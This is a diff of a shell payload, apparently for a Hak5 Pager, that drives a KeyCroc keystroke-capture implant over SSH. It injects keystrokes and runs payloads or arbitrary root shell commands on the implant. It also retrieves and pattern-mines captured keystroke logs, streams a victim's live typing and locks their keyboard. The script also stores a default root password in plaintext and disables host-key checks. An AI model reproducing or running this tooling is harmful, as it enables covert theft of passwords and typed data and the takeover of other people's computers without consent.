@@ -3,7 +3,7 @@
 # Title: Pager quack
 # Author: spywill
 # Description: Send QUACK commands to your KeyCroc, as well as read previously captured keystrokes and monitor live keystrokes as they are entered.
-# Version: 2.1
+# Version: 2.2
 
 PROMPT "Send QUACK commands to your KeyCroc, read previously captured keystrokes and monitor live keystrokes.
 sshpass is required for the connection.
@@ -11,7 +11,7 @@ Make sure the Pager and KeyCroc are connected to the same local network.
 Alternatively, KeyCroc can connect directly to the Pager's open access point (AP)"
 
 # Payload variables
-ENGLISH_WORD_LIST="https://raw.githubusercontent.com/dwyl/english-words/master/words_alpha.txt"
+ENGLISH_WORD_LIST="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt"
 SAVE_KEYSTROKE="/mmc/root/payloads/user/remote_access/Pager_quack/KeyCroc_Keystrokes"
 DUCKY_PAYLOAD="/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads"
 PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_passwd.txt"
@@ -21,7 +21,7 @@ chmod 777 /mmc/root/payloads/user/remote_access/Pager_quack
 REMOTE_FILE="/root/loot/croc_char.log"
 i=0
 
-# Create Ducky Payload folder if it does not exist
+# Create Ducky Payload folder if it does not exist.
 if [ ! -d "$DUCKY_PAYLOAD" ] || [ ! -d "$SAVE_KEYSTROKE" ]; then
 	mkdir -p "$DUCKY_PAYLOAD"
 	mkdir -p "$SAVE_KEYSTROKE"
@@ -44,46 +44,88 @@ EOF
 	fi
 fi
 
-# SSH helper
-ssh_croc() {
-	/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
+# OpenSSH multiplexing reuses one authenticated connection for all ssh_croc calls.
+CROC_SSH_CONTROL="/tmp/croc-%r-%h-%p"
+
+# Close the shared SSH connection when the payload exits.
+close_croc_ssh() {
+	[ -n "$croc_ip" ] || return 0
+	ssh -O exit \
+		-o ControlPath="$CROC_SSH_CONTROL" \
 		-o StrictHostKeyChecking=no \
-		-o ConnectTimeout=5 \
-		root@"$croc_ip" "$@"
+		root@"$croc_ip" >/dev/null 2>&1
 }
 
-# SSH test to keycroc
+# SSH helper: reuse one connection and clear a stale master after transport failure.
+ssh_croc() {
+	/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
+		-o ControlMaster=auto \
+		-o ControlPath="$CROC_SSH_CONTROL" \
+		-o ControlPersist=yes \
+		-o StrictHostKeyChecking=no \
+		-o ConnectTimeout=5 \
+		-o ServerAliveInterval=3 \
+		-o ServerAliveCountMax=2 \
+		root@"$croc_ip" "$@"
+	status=$?
+
+	# SSH uses 255 for connection/transport errors. Do not retry a command here:
+	# it may already have run on KeyCroc before the connection dropped.
+	if [ "$status" -eq 255 ]; then
+		ssh -O exit \
+			-o ControlPath="$CROC_SSH_CONTROL" \
+			-o StrictHostKeyChecking=no \
+			root@"$croc_ip" >/dev/null 2>&1
+	fi
+	return "$status"
+}
+
+# Test SSH connectivity to KeyCroc and attempt one reconnection if needed.
 test_ssh() {
+	# Test the SSH connection by sending a brief LED indicator command.
 	if ssh_croc 'sh -lc "LED B ; LED OFF"' 2>/dev/null; then
 		LOG green "KEYCROC REACHABLE"
 		ssh_test="REACHABLE"
 	else
-		LOG red "ERROR: KEYCROC UNREACHABLE"
-		ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE"
-		ssh_test="UNREACHABLE"
-		sleep 10
+		# Report the connection failure and prepare to retry.
+		LOG yellow "[KEYCROC] Connection lost. Trying to reconnect..."
+		sleep 1
+
+		# Retry the SSH connection once using the same LED test.
+		if ssh_croc 'sh -lc "LED B ; LED OFF"' 2>/dev/null; then
+			LOG green "KEYCROC RECONNECTED"
+			ssh_test="REACHABLE"
+		else
+			LOG red "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password."
+			ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password."
+			# Pause before returning and mark the connection as unreachable.
+			sleep 10
+			ssh_test="UNREACHABLE"
+		fi
 	fi
 }
 
-# Checking if sshpass is installed
+# Check whether sshpass is installed on the Pager.
 if opkg list-installed | grep -q "sshpass"; then
 	LOG yellow "Package sshpass is already installed."
 else
-	# Check internet connection
+	# Verify internet connectivity before attempting to download packages.
 	LOG yellow "Checking internet connection."
 	if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
 		ERROR_DIALOG "Internet connection required to install sshpass" ; exit 0
 	fi
 	LOG green "Online"
-	# Confirmation to install sshpass
+	# Ask the user for permission to install sshpass.
 	confirm=$(CONFIRMATION_DIALOG "Install sshpass for password-based SSH connections.") || exit 0
 	if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
 
+		# Install sshpass into the MMC package destination.
 		spinnerid=$(START_SPINNER "Installing sshpass...")
 		opkg update
 		opkg -d mmc install sshpass
 		STOP_SPINNER ${spinnerid}
 
+		# Verify that sshpass is now listed as an installed package.
 		if opkg list-installed | grep -q "sshpass"; then
 			LOG green "sshpass has been installed."
 		else
@@ -94,7 +136,7 @@ else
 	fi
 fi
 
-# resolve croc.lan/croc into IP
+# Resolve the KeyCroc hostname to an IPv4 address, Extract the IP address from the ping response.
 if ip_check=$(ping -4 -c 1 -W 5 croc.lan 2>/dev/null); then
 	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
 	LOG yellow "croc.lan is up at $croc_ip"
@@ -104,9 +146,11 @@ elif ip_check=$(ping -4 -c 1 -W 5 croc 2>/dev/null); then
 else
 	LOG red "croc.lan and croc did not resolve"
 
+	# Check whether a previously saved KeyCroc IP address is available.
 	if [ -f "$CROC_IP_FILE" ]; then
 		LOG green "[KEYCROC] IP file exists $CROC_IP_FILE"
 		ip_check=$(cat "$CROC_IP_FILE")
+		# Use the saved address as the default if the file contains a value.
 		if [ -n "$ip_check" ]; then
 			LOG yellow "Using saved Croc IP: $ip_check"
 		else
@@ -120,21 +164,22 @@ else
 	croc_ip=$(IP_PICKER "Enter keycroc IP" "$ip_check") || exit 0
 fi
 
-# save keycroc ip to file
+# Save keycroc ip to file.
 echo "$croc_ip" > "$CROC_IP_FILE"
 LOG yellow "Saved Keycroc IP $croc_ip at $CROC_IP_FILE"
 
-# Checking if key croc is reachability
+# Checking if key croc is reachability.
 can_reach() {
 	host="$1"
 	ping -4 -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
 	nc -z -w 2 "$host" 22 >/dev/null 2>&1
 }
 
-# Checking and save key croc password
+# Check whether KeyCroc is reachable before requesting its password.
 if can_reach "$croc_ip"; then
 	LOG green "[KEYCROC] $croc_ip reachable"
 
+	# Check whether a saved password file exists.
 	if [ -f "$PASS_FILE" ]; then
 		LOG yellow "[KEYCROC] Password file exists"
 		default_pass=$(cat "$PASS_FILE")
@@ -143,6 +188,7 @@ if can_reach "$croc_ip"; then
 		default_pass="hak5croc"
 	fi
 
+	# Prompt the user to enter or edit the KeyCroc password.
 	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "$default_pass") || exit 0
 	echo "$croc_passwd" > "$PASS_FILE"
 	LOG yellow "Saved Keycroc Password at $PASS_FILE"
@@ -150,29 +196,42 @@ else
 	ERROR_DIALOG "$croc_ip unreachable" ; exit 0
 fi
 
-# Sending QUACK command over SSH
+# Keep the shared SSH master alive while the menus are open; close it on exit.
+trap 'close_croc_ssh' EXIT
+
+# Send a QUACK command or payload file to KeyCroc over SSH.
 Send_Quack() {
 	spinnerid=$(START_SPINNER "Exceeding payload...")
 
-	ssh_croc "sh -lc 'bash -s'" <<EOF
-	$(if [[ -f "$QUACK" ]]; then
-		cat "$QUACK"
-	else
-		echo "$QUACK"
-	fi)
+	# Connect to KeyCroc and pass the command or payload through Bash stdin.
+	if ssh_croc "sh -lc 'bash -s'" <<EOF
+$(if [[ -f "$QUACK" ]]; then
+	cat "$QUACK"
+else
+	echo "$QUACK"
+fi)
 EOF
-
-	STOP_SPINNER ${spinnerid}
-	sleep 1
-	LOG green "Payload has been delivered"
-	LOG blue "$QUACK"
-	PROMPT "Payload has been delivered
-	$resp"
+	then
+		# Stop the spinner and report successful delivery.
+		STOP_SPINNER "$spinnerid"
+		LOG green "Payload has been delivered"
+		LOG blue "$QUACK"
+		PROMPT "Payload has been delivered
+		$QUACK"
+	else
+		# Stop the spinner and report an SSH or delivery failure.
+		STOP_SPINNER "$spinnerid"
+		LOG red "Payload delivery failed."
+		PROMPT "Payload delivery failed."
+		return
+	fi
 }
 
-# Enter a single Quack command
+# Menu for selecting and sending individual QUACK commands to KeyCroc.
 Quack_Command() {
+	# Keep displaying the command menu until the user exits or returns.
 	while true; do
+		# Display the available QUACK commands and keyboard controls.
 		resp=$(LIST_PICKER \
 			"QUACK COMMAND MENU" \
 			"Single_Quack" \
@@ -181,98 +240,131 @@ Quack_Command() {
 			"Quack_Backspace" \
 			"Quack_SpaceBar" \
 			"Quack_GUI" \
-			"Quack_CTRL-C" \
+			"Quack_CTRL-?" \
 			"Quack_Numlock" \
-			"Quack_ALT-F4" \
+			"Quack_ALT-?" \
 			"Quack_TAB" \
 			"Quack_F_Key" \
 			"Quack_Capslock" \
 			"Quack_Arrow_Key" \
+			"Number_pad" \
 			"Exit" \
 			"Main_menu" \
 			"Main_menu"
 		)
 
+		# Run the command associated with the selected menu option.
 		case "$resp" in
 			"Single_Quack")
+				# Prompt the user to enter a custom QUACK command.
 				LOG yellow "[KEYCROC] Single Quack command selected. Ready for payload injection..."
 				QUACK=$(TEXT_PICKER "Enter Quack command" "QUACK STRING hello world") || return
 				Send_Quack
 			;;
 			"Quack_Enter")
+				# Prepare and send the Enter key command.
 				LOG yellow "[KEYCROC] Quack Enter command selected. Ready for payload injection..."
 				QUACK="QUACK ENTER"
 				Send_Quack
 			;;
 			"Quack_Delete")
+				# Prepare and send the Delete key command.
 				LOG yellow "[KEYCROC] Quack Delete command selected. Ready for payload injection..."
 				QUACK="QUACK DELETE"
 				Send_Quack
 			;;
 			"Quack_Backspace")
+				# Prepare and send the Backspace key command.
 				LOG yellow "[KEYCROC] Quack Backspace command selected. Ready for payload injection..."
 				QUACK="QUACK BACKSPACE"
 				Send_Quack
 			;;
 			"Quack_SpaceBar")
+				# Prepare and send the Space key using its HID keycode.
 				LOG yellow "[KEYCROC] Quack SpaceBar command selected. Ready for payload injection..."
 				QUACK="QUACK KEYCODE 00,00,2c"
 				Send_Quack
 			;;
 			"Quack_GUI")
+				# Ask for the key to combine with the GUI modifier.
 				LOG yellow "[KEYCROC] Quack GUI command selected. Ready for payload injection..."
-				QUACK=$(TEXT_PICKER "Enter GUI command" "QUACK GUI") || return
+				GUI_code=$(TEXT_PICKER "Enter GUI control code" "r") || return
+				QUACK="QUACK GUI $GUI_code"
 				Send_Quack
 			;;
-			"Quack_CTRL-C")
-				LOG yellow "[KEYCROC] Quack CTRL-C command selected. Ready for payload injection..."
-				QUACK="QUACK CONTROL-c"
+			"Quack_CTRL-?")
+				# Ask for the key to combine with the CTRL modifier.
+				LOG yellow "[KEYCROC] Quack CTRL-? command selected. Ready for payload injection..."
+				CTRL_code=$(TEXT_PICKER "Enter CTRL control code" "c") || return
+				QUACK="QUACK CONTROL-$CTRL_code"
 				Send_Quack
 			;;
 			"Quack_Numlock")
+				# Prepare and send the Num Lock command.
 				LOG yellow "[KEYCROC] Quack Numlock command selected. Ready for payload injection..."
 				QUACK="QUACK NUMLOCK"
 				Send_Quack
 			;;
-			"Quack_ALT-F4")
-				LOG yellow "[KEYCROC] Quack ALT-F4 command selected. Ready for payload injection..."
-				QUACK="QUACK ALT-F4"
+			"Quack_ALT-?")
+				# Ask for the key to combine with the ALT modifier.
+				LOG yellow "[KEYCROC] Quack ALT-? command selected. Ready for payload injection..."
+				ALT_code=$(TEXT_PICKER "Enter ALT control code" "F4") || return
+				QUACK="QUACK ALT-$ALT_code"
 				Send_Quack
 			;;
 			"Quack_TAB")
+				# Prepare and send the Tab key command.
 				LOG yellow "[KEYCROC] Quack TAB command selected. Ready for payload injection..."
 				QUACK="QUACK TAB"
 				Send_Quack
 			;;
 			"Quack_F_Key")
+				# Ask for a function-key number and build the corresponding command.
 				LOG yellow "[KEYCROC] Quack F-Key command selected. Ready for payload injection..."
 				F_KEY=$(NUMBER_PICKER "Enter F-key number" "1") || return
 				QUACK="QUACK F$F_KEY"
 				Send_Quack
 			;;
 			"Quack_Capslock")
+				# Prepare and send the Caps Lock command.
 				LOG yellow "[KEYCROC] Quack Capslock command selected. Ready for payload injection..."
 				QUACK="QUACK CAPSLOCK"
 				Send_Quack
 			;;
 			"Quack_Arrow_Key")
+				# Enable interactive arrow-key control for the remote device.
 				LOG yellow "[KEYCROC] Quack Arrow keys command selected. Ready for payload injection..."
 				LOG yellow "[PAGER] Use the arrow keys on the Pager to control arrow-key input on the target device..."
 				LOG green "PRESS A BUTTON TO RETURN TO MENU"
+
+				# Wait for Pager input and translate arrow keys into QUACK commands.
 				while true; do
 					arrow_key=$(WAIT_FOR_INPUT)
-	
+
+					# Send the Arrow command and stop if SSH fails.
 					if [ "$arrow_key" = UP ]; then
-						ssh_croc 'sh -lc "QUACK UPARROW"'
+						if ! ssh_croc 'sh -lc "QUACK UPARROW"'; then
+							LOG red "[KEYCROC] Connection lost. Returning to menu."
+							return
+						fi
 						LOG blue "UPARROW"
 					elif [ "$arrow_key" = DOWN ]; then
-						ssh_croc 'sh -lc "QUACK DOWNARROW"'
+						if ! ssh_croc 'sh -lc "QUACK DOWNARROW"'; then
+							LOG red "[KEYCROC] Connection lost. Returning to menu."
+							return
+						fi
 						LOG blue "DOWNARROW"
 					elif [ "$arrow_key" = LEFT ]; then
-						ssh_croc 'sh -lc "QUACK LEFTARROW"'
+						if ! ssh_croc 'sh -lc "QUACK LEFTARROW"'; then
+							LOG red "[KEYCROC] Connection lost. Returning to menu."
+							return
+						fi
 						LOG blue "LEFTARROW"
 					elif [ "$arrow_key" = RIGHT ]; then
-						ssh_croc 'sh -lc "QUACK RIGHTARROW"'
+						if ! ssh_croc 'sh -lc "QUACK RIGHTARROW"'; then
+							LOG red "[KEYCROC] Connection lost. Returning to menu."
+							return
+						fi
 						LOG blue "RIGHTARROW"
 					elif [ "$arrow_key" = A ]; then
 						LOG yellow "Returning to menu."
@@ -282,6 +374,39 @@ Quack_Command() {
 						return
 					fi
 				done
+			;;
+			"Number_pad")
+				# Ask the user to enter a number to send to KeyCroc.
+				LOG yellow "[KEYCROC] Number pad. Enter any number..."
+				NUMBER=$(NUMBER_PICKER "Number pad" "1") || return
+				spinnerid=$(START_SPINNER "Exceeding payload...")
+				success=1
+
+				# Process the number one digit at a time.
+				for ((i = 0; i < ${#NUMBER}; i++)); do
+					digit="${NUMBER:$i:1}"
+					QUACK="QUACK $digit"
+
+					# Send the QUACK command to KeyCroc over SSH.
+					if ! ssh_croc "sh -lc 'bash -s'" <<EOF
+$QUACK
+EOF
+					then
+						success=0
+						break
+					fi
+				done
+				STOP_SPINNER "$spinnerid"
+
+				# Report whether all digits were delivered successfully.
+				if (( success )); then
+					LOG green "Payload has been delivered"
+					LOG blue "$NUMBER"
+					PROMPT "Payload has been delivered $NUMBER"
+				else
+					LOG red "Payload delivery failed."
+					PROMPT "Payload delivery failed."
+				fi
 			;;
 			"Main_menu")
 				LOG yellow "Return to main menu"
@@ -297,7 +422,7 @@ Quack_Command() {
 	done
 }
 
-# Run a ducky payload
+# Run a ducky payload.
 Ducky_Payload() {
 	LOG blue "================================================="
 	LOG yellow "Selected a ducky payload Ensure to give your payload a name"
@@ -306,19 +431,19 @@ Ducky_Payload() {
 	LOG cyan "[/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads/name_of_payload.txt]"
 	LOG blue "================================================="
 
-	# Build the list of .txt files
+	# Build the list of .txt files.
 	set --
 	for file in "$DUCKY_PAYLOAD"/*.txt; do
 	[ -f "$file" ] || continue
 		set -- "$@" "$(basename "$file")"
 	done
-	# Check if any files were found
+	# Check if any files were found.
 	if [ "$#" -eq 0 ]; then
 		LOG red "No .txt files found in $DUCKY_PAYLOAD"
 		PROMPT "No .txt files found in $DUCKY_PAYLOAD"
 		return
 	fi
-	# Build the main payload menu
+	# Build the main payload menu.
 	resp=$(LIST_PICKER \
 		"DUCKY PAYLOAD MENU" \
 		"$@" \
@@ -347,14 +472,14 @@ Ducky_Payload() {
 				;;
 			esac
 
-			# Verify the selected payload exists
+			# Verify the selected payload exists.
 			if [ ! -f "$DUCKY_PAYLOAD/$view_resp" ]; then
 				LOG red "[PAGER] ERROR: Selected payload was not found."
 				PROMPT "[PAGER] ERROR: Payload not found."
 				return
 			fi
 
-			# Display the payload contents
+			# Display the payload contents.
 			LOG green "[PAGER] Viewing payload: $view_resp"
 			PROMPT "Payload displayed: $view_resp"
 			LOG "$(cat "$DUCKY_PAYLOAD/$view_resp")"
@@ -364,7 +489,7 @@ Ducky_Payload() {
 		"Remove_Payload")
 			LOG red "[PAGER] Payload deletion selected."
 
-			# Select the payload to remove
+			# Select the payload to remove.
 			remove_resp=$(LIST_PICKER \
 				"REMOVE PAYLOAD" \
 				"$@" \
@@ -379,14 +504,14 @@ Ducky_Payload() {
 				;;
 			esac
 
-			# Verify the selected file exists
+			# Verify the selected file exists.
 			if [ ! -f "$DUCKY_PAYLOAD/$remove_resp" ]; then
 				LOG red "[PAGER] ERROR: Selected payload was not found."
 				PROMPT "[PAGER] ERROR: Payload not found."
 				return
 			fi
 
-			# Confirm payload deletion
+			# Confirm payload deletion.
 			confirm=$(CONFIRMATION_DIALOG "[PAGER] Delete payload $remove_resp from the device?") || return
 			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
 				if rm "$DUCKY_PAYLOAD/$remove_resp"; then
@@ -401,11 +526,11 @@ Ducky_Payload() {
 			fi
 		;;
 		"KeyCroc_Payload")
-			# Find keycroc selected payload
+			# Find keycroc selected payload.
 			croc_payload="/root/udisk/payloads"
 			LOG yellow "[KEYCROC] Select a payload to view/execute..."
 
-			# Retrieve remote payload filenames
+			# Retrieve remote payload filenames.
 			payload_list=$(ssh_croc "find '$croc_payload' -maxdepth 1 -type f \( -name '*.txt' -o -name '*.sh' \) -exec basename '{}' \;" 2>/dev/null)
 
 			if [ -z "$payload_list" ]; then
@@ -414,7 +539,7 @@ Ducky_Payload() {
 				return
 			fi
 
-			# Build payload menu
+			# Build payload menu.
 			set --
 			while IFS= read -r file; do
 				[ -n "$file" ] && set -- "$@" "$file"
@@ -445,7 +570,7 @@ EOF
 
 					LOG green "[KEYCROC] Viewing: $view_resp"
 
-					# Display remote file contents
+					# Display remote file contents.
 					content=$(ssh_croc "cat '$croc_payload/$view_resp'" 2>/dev/null) || {
 						LOG red "[KEYCROC] Failed to read payload."
 						PROMPT "Failed to read payload"
@@ -471,7 +596,7 @@ EOF
 					return
 				;;
 				*)
-					# Verify the remote payload exists
+					# Verify the remote payload exists.
 					if ! ssh_croc "test -f '$croc_payload/$resp'" 2>/dev/null; then
 						LOG red "[KEYCROC] Payload not found."
 						PROMPT "Payload not found"
@@ -485,6 +610,8 @@ EOF
 					fi
 
 					LOG green "[KEYCROC] Activating payload: $resp"
+					LOG cyan "[KEYCROC] Payload contents:"
+					LOG "$(ssh_croc "cat '$croc_payload/$resp'")"
 
 					case "$resp" in
 						*.sh)
@@ -494,18 +621,22 @@ EOF
 						*.txt)
 							LOG cyan "[KEYCROC] The .txt payload is managed by the KeyCroc framework."
 							LOG yellow "[KEYCROC] Its MATCH conditions determine when it executes."
+							# Retrieve the payload's MATCH condition from the remote file.
 							LOG cyan "[KEYCROC] Reading payload MATCH condition..."
 							match_word=$(ssh_croc "grep -i '^[[:space:]]*MATCH' '$croc_payload/$resp'" 2>/dev/null)
 
+							# Continue only if a MATCH condition was found.
 							if [ -n "$match_word" ]; then
 								LOG blue "========================================"
 								LOG yellow "[KEYCROC] PAYLOAD MATCH CONDITION"
 								LOG yellow "PAYLOAD: $croc_payload/$resp"
 								LOG green "Match word: $match_word"
 								LOG blue "========================================"
+								# Show the MATCH condition in a prompt.
 								PROMPT "[KEYCROC] PAYLOAD MATCH CONDITION
 								PAYLOAD: $croc_payload/$resp
 								Match word: $match_word"
+								# Execute the selected payload on the remote KeyCroc.
 								ssh_croc "sh -lc '$croc_payload/$resp'"
 								status=$?
 							else
@@ -542,7 +673,7 @@ EOF
 			return
 		;;
 		*)
-			# Find the selected payload
+			# Find the selected payload.
 			QUACK=""
 			for file in "$DUCKY_PAYLOAD"/*.txt; do
 				[ -f "$file" ] || continue
@@ -571,16 +702,17 @@ EOF
 	esac
 }
 
-# Previous/live keystrokes menu
+# Previous/live keystrokes menu.
 keystrokes() {
 
-	# Fetch remote file
+	# Fetch and display the contents of matching remote log files.
 	process_logs() {
 		log="$1"
 
 		LOG yellow "[KEYCROC] Previous $key selected. Accessing stored data..."
 		spinnerid=$(START_SPINNER "Collecting $key...")
 
+		# Display each file's path, character count, separator, and contents.
 		OUTPUT=$(
 			ssh_croc "find / -type f -name '$log' 2>/dev/null -exec sh -c '
 				for file do
@@ -597,6 +729,7 @@ keystrokes() {
 		STOP_SPINNER ${spinnerid}
 		sleep 1
 
+		# Display the collected output one line at a time in the Pager UI.
 		while IFS= read -r line; do
 			LOG "$line"
 		done <<< "$OUTPUT"
@@ -605,12 +738,12 @@ keystrokes() {
 		WAIT_FOR_BUTTON_PRESS A
 	}
 
-	# Pattern matching croc_char.log
+	# Pattern matching croc_char.log.
 	pattern_matching() {
 		LOG yellow "Patterns sorted by frequency:"
 		spinnerid=$(START_SPINNER "Patterns sorted by frequency")
 
-		# Collect croc_char.log files from KeyCroc
+		# Collect croc_char.log files from KeyCroc.
 		content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')
 		if [[ -z "$content" ]]; then
 			STOP_SPINNER ${spinnerid}
@@ -618,7 +751,7 @@ keystrokes() {
 			return
 		fi
 
-		# Count common patterns
+		# Count common patterns.
 		patterns=$(printf '%s\n' "$content" | \
 			grep -oE '[[:alnum:]_]+|[^[:alnum:]_[:space:]]+' | \
 			awk '{count[$1]++} END {
@@ -632,7 +765,7 @@ keystrokes() {
 		LOG green "PRESS A BUTTON TO CONTINUE"
 		WAIT_FOR_BUTTON_PRESS A
 
-		# Find repeated character sequences
+		# Find repeated character sequences.
 		LOG yellow "Find repeated character sequences:"
 		spinnerid=$(START_SPINNER "Repeated character sequences")
 		output=$(ssh_croc 'find / -type f -name "croc_char.log" -exec sed '\''s/\[[^]]*\]//g'\'' {} + 2>/dev/null | \
@@ -655,7 +788,9 @@ keystrokes() {
 			done
 		else
 			STOP_SPINNER ${spinnerid}
-			LOG red "No repeated character sequences found"
+			LOG red "No repeated character sequences found."
+			PROMPT "No repeated character sequences found."
+			return
 		fi
 
 		LOG green "PRESS A BUTTON TO RETURN TO MENU"
@@ -667,7 +802,7 @@ keystrokes() {
 	"Previous_keystrokes" \
 	"Live_keystrokes" \
 	"Saved_keystrokes" \
-	"croc_raw" \
+	"croc_raw.log" \
 	"matches.log" \
 	"QUACK.log" \
 	"hotplug.log" \
@@ -687,46 +822,71 @@ keystrokes() {
 		;;
 		"Live_keystrokes")
 			LOG yellow "[KEYCROC] Live keystroke stream selected. Initializing capture..."
-			LOG ""
 			LOG green "PRESS A BUTTON TO STOP LIVE KEYSTROKES"
 
 			spinnerid=$(START_SPINNER "WAITING FOR KEYBOARD ACTIVITY")
 			ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"'
-			STOP_SPINNER ${spinnerid}
-			LOG blue "[KEYCROC] Live keystroke stream starting..."
+			STOP_SPINNER "${spinnerid}"
 
-			# Start Live keystrokes ssh session
-			ssh_croc \
-			"tail -c 10 -f '$REMOTE_FILE'" |
+			LOG blue "[KEYCROC] Live keystroke stream starting..."
+			# Create a unique temporary FIFO (named pipe) for live keystroke streaming.
+			live_fifo="/tmp/live_keys_$$"
+
+			# Create the FIFO or log an error and return if creation fails.
+			mkfifo "$live_fifo" || {
+				LOG red "[KEYCROC] Failed to create live stream."
+				return
+			}
+
+			# Start the display loop.
+			(
 			while IFS= read -r -n1 char; do
 				LOG "$char"
-			done &
-			live_pid=$!
+			done < "$live_fifo"
+			) &
+			live_reader_pid=$!
 
-			# Kill Live keystrokes ssh session
+			# Start a dedicated SSH client, reusing the shared master.
+			/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
+				-o ControlMaster=auto \
+				-o ControlPath="$CROC_SSH_CONTROL" \
+				-o ControlPersist=yes \
+				-o StrictHostKeyChecking=no \
+				-o ConnectTimeout=5 \
+				-o ServerAliveInterval=3 \
+				-o ServerAliveCountMax=2 \
+				root@"$croc_ip" "exec tail -c 10 -f '$REMOTE_FILE'" \
+				> "$live_fifo" 2>/dev/null &
+			live_ssh_pid=$!
+
+			# Wait for the stop button.
 			WAIT_FOR_BUTTON_PRESS A
 			LOG red "[KEYCROC] Terminating live keystroke session..."
 
-			kill -9 "$live_pid" 2>/dev/null
-			ps w | grep '[s]sh -o StrictHostKeyChecking=no' |
-			while read -r pid rest; do
-				kill -9 "$pid" 2>/dev/null
-			done
-			sleep 2
+			# Terminate only this live SSH client, not the shared master.
+			kill -9 "$live_ssh_pid" 2>/dev/null
+
+			# Close the display loop and remove the FIFO.
+			kill -9 "$live_reader_pid" 2>/dev/null
+			wait "$live_ssh_pid" 2>/dev/null
+			wait "$live_reader_pid" 2>/dev/null
+			rm -f "$live_fifo"
+
+			PROMPT "[KEYCROC] Live keystroke session stopped."
 		;;
 		"Saved_keystrokes")
 			LOG yellow "[PAGER] Accessing saved keystrokes..."
 			if [ -f "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" ]; then
 
-				# Confirm whether to strip [[ ]] markers from saved keystrokes
+				# Confirm whether to strip [[ ]] markers from saved keystrokes.
 				confirm=$(CONFIRMATION_DIALOG "Reading captured keystrokes. Strip [[ ]] markers from filtered output...")
 					if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
-						# Display saved keystrokes with [[ ]] markers removed
+						# Display saved keystrokes with [[ ]] markers removed.
 						log_char_count=$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" | wc -m)
 						LOG "Character Count: $log_char_count"
 						LOG "$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt")"
 					else
-						# Display saved keystrokes without filtering
+						# Display saved keystrokes without filtering.
 						while IFS= read -r line; do
 							LOG "$line"
 						done < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
@@ -740,7 +900,7 @@ keystrokes() {
 				PROMPT "[PAGER] No saved keystroke files found in $SAVE_KEYSTROKE."
 			fi
 		;;
-		"croc_raw") process_logs "$key" ;;
+		"croc_raw.log") process_logs "$key" ;;
 		"matches.log") process_logs "$key" ;;
 		"QUACK.log") process_logs "$key" ;;
 		"hotplug.log") process_logs "$key" ;;
@@ -751,7 +911,7 @@ keystrokes() {
 			pattern=$(TEXT_PICKER "Enter pattern to search" "hak5") || return
 			content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')
 
-			# Count every occurrence of the search pattern, including multiple matches on the same line
+			# Count every occurrence of the search pattern, including multiple matches on the same line.
 			count=$(printf '%s\n' "$content" | awk -v p="$pattern" '
 			{
 				while ((pos = index($0, p)) > 0) {
@@ -763,14 +923,14 @@ keystrokes() {
 				print count + 0
 			}')
 
-			# Count output of search pattern
+			# Count output of search pattern.
 			if [ "$count" -gt 0 ]; then
 				LOG green "[KEYCROC] Match found in loot/croc_char.log."
 				LOG yellow "[$pattern] Match count: $count"
 				PROMPT "[$pattern] Match count: $count"
 			else
-				LOG red "Did not find match word/pattern in loot/croc_char.log"
-				LOG red "Pattern: $pattern"
+				LOG red "Did not find match $pattern in loot/croc_char.log"
+				PROMPT "Did not find match $pattern in loot/croc_char.log"
 			fi
 		;;
 		"Main_menu")
@@ -786,9 +946,9 @@ keystrokes() {
 	esac
 }
 
-# Custom commands menu
+# Menu for custom KeyCroc commands and keyboard-control functions.
 Custom_commands() {
-	# Function to stop attack
+	# Wait for a button press, terminate the active attack, and clean up.
 	stop_attack() {
 		WAIT_FOR_BUTTON_PRESS ANY
 		kill -9 "$attack_pid" 2>/dev/null
@@ -798,6 +958,7 @@ Custom_commands() {
 		unset i
 	}
 
+	# Display the available custom commands and keyboard controls.
 	custom=$(LIST_PICKER \
 		"CUSTOM COMMANDS MENU" \
 		"Custom_command" \
@@ -811,54 +972,65 @@ Custom_commands() {
 		"Main_menu"
 	)
 
+	# Execute the action selected from the custom commands menu.
 	case "$custom" in
 		"Custom_command")
+			# Ask the user to enter a custom remote shell command.
 			LOG yellow "[KEYCROC] Custom shell command selected. Awaiting command input..."
 			custom=$(TEXT_PICKER "Enter Custom shell command" 'for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do basename "$file_path"; done') || return
 
+			# Stop if the user submits an empty command.
 			if [[ -z "$custom" ]]; then
+				LOG red "No custom command entered"
 				PROMPT "No custom command entered"
 				return
 			fi
 
-			# Output for Custom shell command
+			# Display the output returned by the remote command.
 			output=$(ssh_croc "$custom")
 			LOG yellow "[KEYCROC] Custom shell command output:"
 			LOG "$output"
 			PROMPT "$output"
 		;;
 		"Lock_keyboard")
+			# Send the keyboard-lock command to KeyCroc.
 			LOG yellow "[KEYCROC] Keyboard lock selected. Locking input device..."
 			ssh_croc 'sh -lc "QUACK LOCK"'
 			LOG red "Warning: keyboard is now locked out"
 			PROMPT "Warning: keyboard is now locked out"
 		;;
 		"Unlock_keyboard")
+			# Send the keyboard-unlock command to restore input access.
